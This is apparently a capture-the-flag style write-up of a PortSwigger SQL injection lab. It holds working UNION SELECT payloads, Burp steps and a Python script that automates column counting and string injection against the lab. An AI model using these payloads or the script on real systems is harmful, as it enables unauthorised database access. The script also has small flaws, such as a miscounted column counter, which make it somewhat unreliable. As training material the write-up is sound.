+++
title = "SQLi Vulnerabilities: Lab 4: SQL injection UNION attack, finding a column containing text"
date = 2025-11-13
lastmod = 2025-11-13
draft = false
author = "bloodstiller"
description = "PortSwigger sqli lab write-up UNION Attack exfiltrate data using python and burpsuite" 
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "portswigger-labs",
  "ctf-writeup",
  "injection",
  "sql",
  "sqli",
  "python",
  "UNION"
]
keywords = [
  "authentication vulnerabilities",
  "SQL",
  "SQLi",
  "PortSwigger authentication lab",
  "web security"
]
toc = true
bold = true
next = true
+++

## Lab 4: SQL injection UNION attack, finding a column containing text: {#lab-4-sql-injection-union-attack-finding-a-column-containing-text}

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
>
> The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

+Important+: This lab is more like a continuation of [SQLi lab 3](https://bloodstiller.com/portswigger/sqli_lab_3/) so I would recommend reading that for a grounding in what's going on here.


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

We are given access to a simple web application which allows us to filter categories of products using the filters on the page, there is also a "My account" section.

At the top of the page we can see the string we need to retrieve in order to solve the lab.
![](/ox-hugo/2025-11-12_10-52.png)

We already know the "category" parameter is vulnerable based on the previous lab however let's re-verify this.


### Establishing SQLi: {#establishing-sqli}

If we send request to repeater we can inject a single quote `'` after the parameter and see we trigger a `500` Error response.
![](/ox-hugo/2025-11-12_10-57.png)

If then add a single another quote we can see that the page returns a `200` OK response.
![](/ox-hugo/2025-11-12_10-58.png)


### Inferring The SQL Query Being Run: {#inferring-the-sql-query-being-run}

Looking at the way the page we can infer the query being run is similar to the below.

```sql
SELECT * FROM products WHERE category = 'Pets' AND [rest of query]
```

When we add our single quote it becomes the below which is syntactically incorrect.

```sql
SELECT * FROM products WHERE category = 'Pets'' AND [rest of query]
```

However when we add another quote it becomes the below, closing off the first quotation mark we provided.

```sql
SELECT * FROM products WHERE category = 'Pets''' AND [rest of query]
```


### UNION SELECT Requirements: {#union-select-requirements}

As the lab wants us to display the data using a `UNION SELECT` query we also need to ensure that the two requirements for this attack are met:

1.  **The queries must return the same amount of columns**:
    This means that if the original query that is searching the database returns 5 columns our `UNION` query must also return 5 columns.
    -   **To solve this issue**: We will enumerate the number of columns being returned by the original query.

2.  **The data types in the columns must be compatible with each query**:
    This means that if the table is returning strings such as item names in column 1 our `UNION` query has to also return strings or a compatible data type.
    -   **To solve this issue**: Initially we will use a simple method of returning `NULL` values. This is because `NULL` is convertible/compatible to every data type, so it will mean that the payload should succeed. Once we have established our column count we will then start enumerating the data type of the columns.


### Establishing The Number Of Columns Using UNION SELECT Statement {#establishing-the-number-of-columns-using-union-select-statement}


#### Using Burp: {#using-burp}

In order for us to display data we need to establish how many columns are in the existing database we easily do this in burp.

If we return back to repeater we can enter the payload

```sql
' UNION SELECT NULL--
```

![](/ox-hugo/2025-11-12_11-01.png)
We then select the payload &amp; press `CTRL+U` to URL encode it.
![](/ox-hugo/2025-11-12_11-02.png)

If we send this payload we get a `500` response meaning the number of columns is not correct, so add another `NULL` so our payload and repeat the process.

```sql
' UNION SELECT NULL,NULL--
```

We keep doing this, increasing the `NULL` value until we have the payload below which returns a `200` response.

```sql
' UNION SELECT NULL,NULL,NULL--
```

We can also see the additional column is being displayed at the bottom of the table with no (`NULL`) values.
![](/ox-hugo/2025-11-12_11-15.png)
This means the table has 3 columns.


#### Using Python: {#using-python}


##### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


##### Imports: {#imports}

First we import the modules we will need, `requests` &amp; `os`. We also suppress the `requests` warning that will show.

```python
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
```

If we didn't suppress the warnings the output would look like this.
![](/ox-hugo/2025-11-06_06-02.png)


##### Proxy Setup: {#proxy-setup}

Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

```python
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
```


##### Variable Declaration: {#variable-declaration}

<!--list-separator-->

-  Proxies &amp; URL:

    We declare an array of proxies to proxy our requests through as well as the unique url &amp; category endpoint.
    +Note+: The category and URL vary from instance to instance.

    ```python
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    url="https://0a5e00c103ca8c1c82d124d600ec0021.web-security-academy.net/filter?category=Pets"
    ```

<!--list-separator-->

-  SQL Syntax &amp; Counters:

    So now we have our payload broken up into various elements, the reason for this is because we don't want to just supply a list of multiple `UNION SELECT` statements, doing it this way offers more flexibility as well as ensuring we don't repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn't advise that but you could)

    We also create a `counter` variable and set it to `2`. This `counter` is used to track how many `NULL` values (columns) are in our `UNION SELECT` payload as we build it. Our starting payload is:

    ```python
    payload = union + nullPayload # "' UNION SELECT NULL"
    ```

    So before the loop runs we already have one `NULL` in the query. Inside the loop, we keep appending more `,NULL` values to `payload` and update `counter` to reflect the number of columns.

    We don’t start the `counter` at `0` because SQL columns are conceptually counted from 1 (first column, second column etc&#x2026;) and our payload already includes the first `NULL` column. If we started from 0, the value of `counter` would always lag behind the actual number of `NULL` columns in the query. By starting at `2`, the value of `counter` stays aligned with the true column count once we begin adding additional `NULL` values in the loop.

    ```python
    union="' UNION SELECT "
    comma=","
    nullPayload="NULL"
    comment="--"
    additionalNull=comma+nullPayload
    payload=union+nullPayload
    counter=2
    ```


##### For Loop With Request: {#for-loop-with-request}

We declare a for loop will which repeat for 10 total iterations.

Then we have a `try` block which will send our get request to the `url` with `payload` &amp; `comment`.

**Response Monitoring**: We then monitor the responses and if the value "My account" is found in the body of the response we will:

-   Print the string `"Valid payload {payload}-- there are {counter} columns."` which will contain the actual payload as well as the number of columns.
-   Print the full Lab URL including comment and payload so we can easily verify it in a browser.

If these above conditions are met it will `break` out of the loop and stop the process.

If the above is not found it will add an additional `NULL` value using the `additionalNull` variable to the payload &amp; increment the `counter` by `1` and continue.

```python
for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'My account' in request.text:
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           break
        payload=payload+additionalNull
        counter+=i
```


##### Error Handling: {#error-handling}

These `except` clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.

```python
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Full Script: {#full-script}

```python
#!/usr/bin/env python3
import requests
import os
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0a5e00c103ca8c1c82d124d600ec0021.web-security-academy.net/filter?category=Pets"

union="' UNION SELECT "
comma=","
nullPayload="NULL"
comment="--"
additionalNull=comma+nullPayload
payload=union+nullPayload
counter=2

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'My account' in request.text:
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")
           break
        payload=payload+additionalNull
        counter+=i

    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Running The Script: {#running-the-script}

As we can see it tells what we expect, there are 3 columns and the correction payload is:

```sql
' UNION SELECT NULL,NULL,NULL--
```

{{< figure src="/ox-hugo/2025-11-12_11-07.png" >}}


### Establishing Column Data Type VIA UNION SELECT Statement: {#establishing-column-data-type-via-union-select-statement}


#### Using Burp: {#using-burp}

Much like how we established the number of columns we can use repeater to determine the column data type.

We know to pass the lab we need to display a specific string so we will not systematically start replacing the `NULL` values of our payload with the string values `'a'`. This means our payload becomes:

```sql
'+UNION+SELECT+'a',NULL,NULL--
```

As we can see this didn't work.
![](/ox-hugo/2025-11-12_11-13.png)

We now modify our payload so the string value is in the second `NULL` position and revert the first position to be `NULL` again.

```sql
'+UNION+SELECT+NULL,'a',NULL--
```

We can see this time it worked and that our 'a' is displayed in the table.
![](/ox-hugo/2025-11-12_11-17.png)

Now to solve the lab all we have to do is copy the randomly generated string from the lab into our payload string position.

```sql
'+UNION+SELECT+NULL,'fooOGX',NULL--
```

{{< figure src="/ox-hugo/2025-11-12_11-23.png" >}}

And we have solved the lab.
![](/ox-hugo/2025-11-12_11-23_1.png)


#### Using Python: {#using-python}

+Note+: I did this on a new instance of the lab so the string to display is a different value.
We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we have added.

```diff
+labString="'b0Sjkd'"

for i in range(10):
    try:
        request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3)
        if 'My account' in request.text:
           print(f"Valid payload {payload}-- there are {counter} columns.")
           print(f"Lab Url: {url+payload+comment}")

+           payloadList=[nullPayload] * counter
+           for y in range(len(payloadList)):
+               if payloadList[y] == "NULL":
+                   payloadList[y] = labString
+                   newPayload=(",".join(payloadList))
+                   request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
+                   if 'My account' in request.text:
+                       print("---")
+                       print(f"Valid payload {newPayload}--")
+                       print(f"Lab Url: {url+union+newPayload+comment}")
+                   payloadList[y] = "NULL"

        payload=payload+additionalNull
        counter+=i
```

**Lab String**:
First we add the string `labString` that the lab want's us to display to solve it.

```python
labString="'b0Sjkd'"
```

**List Creation**:
We then create a `payloadList` that's contents is the value of `nullPayload` (which is "NULL") and this is equal to the value of the counter so if the counter is 3 then the list value is `['NULL', 'NULL', 'NULL']`

```python
payloadList=[nullPayload] * counter
```

**List Iteration**:

```python
if payloadList[y] == "NULL":
   payloadList[y] = labString
```

We now iterate through the length of the list and if the value of `y` in the list is equal to `NULL` (which it will be) we replace that with the labstring. So on the first run it would `['b0Sjkd', NULL, NULL]`.

**New Payload Creation**:

```python
newPayload=(",".join(payloadList))
```

We then join our list together into a string so we can pass this to our request later, and we ensure we separate  with a comma `,` other wise our payload would be `"PlIGqt'NULLNULL"`

**Send our Request**:

```python
request=requests.get(url + union + newPayload + comment, proxies=proxies, verify=False, timeout=3)
if 'My account' in request.text:
    print("---")
    print(f"Valid payload {newPayload}--")
    print(f"Lab Url: {url+union+newPayload+comment}")
    break
```

Next we send out request like before but this time we are using our new payload. We also need to ensure we send the `"union"` variable as this is not currently present in our list/string/payloadstring.

We also perform the same type of check in the body of the request for the string "My account" which will signify that we have had a `200` OK response, and in this event it will print out the payload &amp; lab string &amp; then `break` out of the loop.

**Reset The `NULL` Value**:

```python
payloadList[y] = "NULL"
```

In the event that we do not get a `200` response we rest the list position `y` to be `NULL` again as other wise the list would just be full of the lab string.

As you can see it worked and we solve the lab.
![](/ox-hugo/2025-11-13_06-11.png)
